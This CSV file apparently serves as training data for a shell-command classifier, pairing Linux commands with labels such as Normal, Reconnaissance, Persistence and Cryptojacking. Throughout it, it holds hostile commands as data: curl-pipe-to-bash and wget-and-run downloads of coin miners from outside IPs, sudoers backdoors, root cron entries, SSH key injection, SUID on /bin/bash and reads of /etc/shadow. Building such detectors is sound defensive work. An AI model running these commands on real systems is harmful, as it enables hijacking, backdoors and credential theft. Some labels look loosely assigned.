command,label
cat /etc/passwd,Reconnaissance
cat /etc/passwd,Reconnaissance
cat /etc/shadow,Reconnaissance
cd /home/user && pwd,Normal
ping -c 4 github.com,Normal
cat /etc/shadow,Reconnaissance
crontab -e,Persistence
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
ls -la /var/log,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
ip a && route -n,Reconnaissance
top -n 1,Normal
wget http://10.0.0.5/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o monerohash.com:3333,Cryptojacking
cd /home/user && pwd,Normal
cat /etc/passwd,Reconnaissance
wget http://10.0.0.5/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o nanopool.org:14433,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
nohup ./xmrig -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
cd /home/user && pwd,Normal
ip a && route -n,Reconnaissance
history,Normal
curl -s http://185.12.33.1/miner.tar.gz | bash,Cryptojacking
whoami,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
uname -a && id && w,Reconnaissance
wget http://45.33.32.156/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o pool.supportxmr.com:3333,Cryptojacking
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
cat /etc/shadow,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
htop,Normal
echo 'checking system logs',Normal
chmod u+s /bin/bash,Persistence
cat /etc/shadow,Reconnaissance
crontab -e,Persistence
chmod u+s /bin/bash,Persistence
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
clear,Normal
clear,Normal
echo 'checking system logs',Normal
chmod u+s /bin/bash,Persistence
chmod u+s /bin/bash,Persistence
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
history,Normal
crontab -e,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
cat /etc/passwd,Reconnaissance
cd /home/user && pwd,Normal
history,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
ps aux | grep root,Reconnaissance
curl -s http://45.33.32.156/update.sh | bash,Cryptojacking
htop,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
ping -c 4 142.250.190.46,Normal
cat /etc/shadow,Reconnaissance
history,Normal
history,Normal
history,Normal
chmod u+s /bin/bash,Persistence
netstat -tulpn,Reconnaissance
uname -a && id && w,Reconnaissance
cat /etc/passwd,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
cat /etc/passwd,Reconnaissance
top -n 1,Normal
history,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
chmod u+s /bin/bash,Persistence
cat /etc/passwd,Reconnaissance
htop,Normal
top -n 1,Normal
ping -c 4 github.com,Normal
crontab -e,Persistence
echo 'checking system logs',Normal
ps aux | grep root,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ip a && route -n,Reconnaissance
cd /home/user && pwd,Normal
ps aux | grep root,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
ps aux | grep root,Reconnaissance
nohup ./xmr-stak -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
uname -a && id && w,Reconnaissance
wget http://10.0.0.5/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o monerohash.com:3333,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://185.12.33.1/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./kdevtmpfsi -o minexmr.com:443' >> /etc/crontab,Cryptojacking
curl -s http://185.12.33.1/cron.sh | bash,Cryptojacking
wget http://45.33.32.156/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o monerohash.com:3333,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
wget http://github.com/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o nanopool.org:14433,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
cat /etc/passwd,Reconnaissance
ip a && route -n,Reconnaissance
ip a && route -n,Reconnaissance
ps aux | grep root,Reconnaissance
cat /etc/shadow,Reconnaissance
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://45.33.32.156/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./xmr-stak -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
cat /var/log/syslog | grep error,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /etc/shadow,Reconnaissance
cat /etc/shadow,Reconnaissance
chmod u+s /bin/bash,Persistence
netstat -tulpn,Reconnaissance
wget http://45.33.32.156/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o pool.supportxmr.com:3333,Cryptojacking
clear,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
uname -a && id && w,Reconnaissance
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
ps aux | grep root,Reconnaissance
cat /proc/cpuinfo; pkill -f coinminer; wget https://142.250.190.46/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./coinminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ls -la /var/log,Normal
cat /etc/shadow,Reconnaissance
cat /etc/passwd,Reconnaissance
crontab -e,Persistence
cat /etc/shadow,Reconnaissance
cd /home/user && pwd,Normal
chmod u+s /bin/bash,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
ls -la /var/log,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
nohup ./xmr-stak -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
cat /proc/cpuinfo; pkill -f cpuminer; wget https://45.33.32.156/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./cpuminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
echo 'checking system logs',Normal
crontab -e,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
nohup ./cpuminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
curl -s http://bitbucket.org/miner.tar.gz | bash,Cryptojacking
htop,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
nohup ./kdevtmpfsi -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
uname -a && id && w,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
ls -la /var/log,Normal
nohup ./xmrig -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
htop,Normal
cat /proc/cpuinfo; pkill -f coinminer; wget https://45.33.32.156/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./coinminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
curl -s http://45.33.32.156/syslogd | bash,Cryptojacking
cat /etc/passwd,Reconnaissance
netstat -tulpn,Reconnaissance
wget http://bitbucket.org/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o nanopool.org:14433,Cryptojacking
ps aux | grep root,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
wget http://10.0.0.5/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o monerohash.com:3333,Cryptojacking
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
ip a && route -n,Reconnaissance
uname -a && id && w,Reconnaissance
cat /etc/passwd,Reconnaissance
wget http://192.168.1.50/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o pool.supportxmr.com:3333,Cryptojacking
curl -s http://142.250.190.46/syslogd | bash,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
cat /proc/cpuinfo; pkill -f coinminer; wget https://bitbucket.org/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./coinminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
curl -s http://45.33.32.156/syslogd | bash,Cryptojacking
ps aux | grep root,Reconnaissance
wget http://45.33.32.156/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o pool.supportxmr.com:3333,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://bitbucket.org/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./xmr-stak -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
ps aux | grep root,Reconnaissance
echo 'checking system logs',Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
wget http://142.250.190.46/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o pool.supportxmr.com:3333,Cryptojacking
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
nohup ./xmrig -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
cat /proc/cpuinfo; pkill -f cpuminer; wget https://10.0.0.5/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./cpuminer -o minexmr.com:443' >> /etc/crontab,Cryptojacking
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
history,Normal
cat /proc/cpuinfo; pkill -f xmrig; wget https://10.0.0.5/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmrig -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
cd /home/user && pwd,Normal
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
cat /etc/shadow,Reconnaissance
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
chmod u+s /bin/bash,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ip a && route -n,Reconnaissance
htop,Normal
cat /var/log/syslog | grep error,Normal
cat /etc/shadow,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
history,Normal
ps aux | grep root,Reconnaissance
clear,Normal
curl -s http://45.33.32.156/cron.sh | bash,Cryptojacking
ping -c 4 github.com,Normal
top -n 1,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
chmod u+s /bin/bash,Persistence
whoami,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
cat /etc/shadow,Reconnaissance
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
top -n 1,Normal
ps aux | grep root,Reconnaissance
cat /var/log/syslog | grep error,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
cat /etc/shadow,Reconnaissance
wget http://185.12.33.1/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o monerohash.com:3333,Cryptojacking
ps aux | grep root,Reconnaissance
clear,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
cd /home/user && pwd,Normal
cat /var/log/syslog | grep error,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://bitbucket.org/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./xmr-stak -o minexmr.com:443' >> /etc/crontab,Cryptojacking
clear,Normal
ip a && route -n,Reconnaissance
whoami,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
cat /etc/passwd,Reconnaissance
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
ps aux | grep root,Reconnaissance
ps aux | grep root,Reconnaissance
cd /home/user && pwd,Normal
uname -a && id && w,Reconnaissance
cat /etc/shadow,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ps aux | grep root,Reconnaissance
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
ping -c 4 github.com,Normal
ip a && route -n,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
cat /proc/cpuinfo; pkill -f minerd; wget https://142.250.190.46/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./minerd -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
wget http://bitbucket.org/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o minexmr.com:443,Cryptojacking
chmod u+s /bin/bash,Persistence
ip a && route -n,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
ps aux | grep root,Reconnaissance
cat /etc/shadow,Reconnaissance
uname -a && id && w,Reconnaissance
chmod u+s /bin/bash,Persistence
history,Normal
chmod u+s /bin/bash,Persistence
clear,Normal
chmod u+s /bin/bash,Persistence
cat /etc/shadow,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
nohup ./xmr-stak -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'checking system logs',Normal
nohup ./cpuminer -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
nohup ./xmrig -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
cat /proc/cpuinfo; pkill -f minerd; wget https://185.12.33.1/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./minerd -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
clear,Normal
wget http://github.com/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o monerohash.com:3333,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
crontab -e,Persistence
nohup ./xmr-stak -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
cat /etc/passwd,Reconnaissance
ip a && route -n,Reconnaissance
ip a && route -n,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
uname -a && id && w,Reconnaissance
cat /etc/passwd,Reconnaissance
cat /etc/passwd,Reconnaissance
cd /home/user && pwd,Normal
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
curl -s http://bitbucket.org/miner.tar.gz | bash,Cryptojacking
cat /proc/cpuinfo; pkill -f minerd; wget https://192.168.1.50/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./minerd -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
htop,Normal
chmod u+s /bin/bash,Persistence
htop,Normal
cat /var/log/syslog | grep error,Normal
cat /var/log/syslog | grep error,Normal
echo 'checking system logs',Normal
sudo apt-get update && sudo apt-get upgrade,Normal
chmod u+s /bin/bash,Persistence
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://10.0.0.5/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./minerd -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
nohup ./kdevtmpfsi -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
ip a && route -n,Reconnaissance
crontab -e,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
crontab -e,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cat /var/log/syslog | grep error,Normal
curl -s http://142.250.190.46/install.sh | bash,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /etc/passwd,Reconnaissance
ps aux | grep root,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
curl -s http://45.33.32.156/cron.sh | bash,Cryptojacking
ls -la /var/log,Normal
cat /etc/passwd,Reconnaissance
nohup ./minerd -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
top -n 1,Normal
chmod u+s /bin/bash,Persistence
cat /etc/shadow,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
htop,Normal
history,Normal
echo 'checking system logs',Normal
ps aux | grep root,Reconnaissance
ping -c 4 45.33.32.156,Normal
whoami,Normal
ps aux | grep root,Reconnaissance
clear,Normal
crontab -e,Persistence
echo 'checking system logs',Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /var/log/syslog | grep error,Normal
cat /etc/shadow,Reconnaissance
ip a && route -n,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
crontab -e,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://bitbucket.org/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
nohup ./xmrig -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
cd /home/user && pwd,Normal
chmod u+s /bin/bash,Persistence
ping -c 4 bitbucket.org,Normal
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
chmod u+s /bin/bash,Persistence
curl -s http://185.12.33.1/update.sh | bash,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
history,Normal
curl -s http://185.12.33.1/update.sh | bash,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
cat /var/log/syslog | grep error,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
htop,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
wget http://github.com/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o monerohash.com:3333,Cryptojacking
cd /home/user && pwd,Normal
ls -la /var/log,Normal
